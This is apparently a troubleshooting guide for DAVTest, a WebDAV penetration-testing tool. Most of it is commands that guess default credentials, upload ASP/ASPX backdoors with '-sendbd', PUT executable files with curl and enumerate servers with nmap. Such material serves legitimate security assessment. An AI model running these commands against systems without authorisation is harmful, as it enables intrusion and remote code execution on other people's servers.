## üéØ What is DAVTest?

DAVTest is a specialized command-line tool for testing WebDAV (Web Distributed Authoring and Versioning) servers to identify misconfigurations and potential file upload vulnerabilities. It automatically tests various file types and HTTP methods to determine what can be uploaded and executed on the target WebDAV server.

**Key Capabilities:**
- **WebDAV Discovery:** Identifies WebDAV-enabled directories and endpoints
- **File Type Testing:** Tests upload capabilities for various file extensions (asp, php, jsp, etc.)
- **Method Enumeration:** Tests supported HTTP methods (PUT, MOVE, COPY, MKCOL, etc.)
- **Execution Testing:** Attempts to execute uploaded files to identify code execution vulnerabilities
- **Authentication Support:** Handles basic HTTP authentication and realm-based access
- **Comprehensive Reporting:** Provides detailed results of upload and execution capabilities

WebDAV servers are commonly found on Windows IIS servers and can provide an attack vector for file upload and remote code execution if misconfigured. DAVTest is particularly valuable when assessing IIS servers with WebDAV enabled, as it quickly identifies potential vulnerabilities that could lead to server compromise.

## ‚ö†Ô∏è Common Issues & Troubleshooting

### Issue 1: Authentication Required (401 Unauthorized)
**Problem Symptoms:**
```bash
OPEN            FAIL:   http://target/webdav    Unauthorized, Basic realm="target"
```

**Solutions:**
```bash
# Use discovered or common credentials
davtest -auth username:password -url http://target/webdav
davtest -auth admin:admin -url http://target/webdav
davtest -auth guest:guest -url http://target/webdav

# Try domain authentication formats
davtest -auth domain\\user:password -url http://target/webdav
davtest -auth user@domain.com:password -url http://target/webdav
```

### Issue 2: WebDAV Directory Not Found (404 Error)
**Problem:** Incorrect WebDAV path specified

**Discovery Solutions:**
```bash
# Use nmap to discover correct WebDAV paths
nmap --script http-enum -p 80,443 target
nmap --script http-webdav-scan -p 80,443 target

# Try common WebDAV directory paths
davtest -url http://target/webdav
davtest -url http://target/dav  
davtest -url http://target/_vti_bin
davtest -url http://target/uploads
davtest -url http://target/files
```

### Issue 3: Upload Succeeds but Execution Fails
**Problem:** Files upload successfully but cannot be executed

**Analysis Approaches:**
```bash
# Check if it's a server configuration issue
curl -X PUT -T test.asp -u user:pass http://target/webdav/test.asp
curl http://target/webdav/test.asp

# Verify file permissions and server response
wget http://target/webdav/uploadedfile.asp
file uploadedfile.asp

# Try different file extensions for same platform
davtest -sendbd asp -auth user:pass -url http://target/webdav
davtest -sendbd aspx -auth user:pass -url http://target/webdav
```

### Issue 4: SSL/TLS Connection Issues
**Problem:** HTTPS WebDAV servers with certificate issues

**Solutions:**
```bash
# Test HTTPS WebDAV endpoints
davtest -auth user:pass -url https://target/webdav

# Manual verification with curl (ignore SSL errors)
curl -u user:pass -X OPTIONS https://target/webdav/ -k
curl -u user:pass -X PUT -T test.txt https://target/webdav/test.txt -k
```

### Issue 5: Connection Timeouts and Network Issues
**Problem:** DAVTest hangs or times out

**Diagnostic Steps:**
```bash
# Check basic connectivity
ping target
curl -I http://target/webdav
telnet target 80

# Verify WebDAV service availability
nmap -p 80,443 --script http-methods target
nmap -p 80,443 --script http-webdav-scan target

# Test with simpler tools first
curl -X OPTIONS http://target/webdav
```
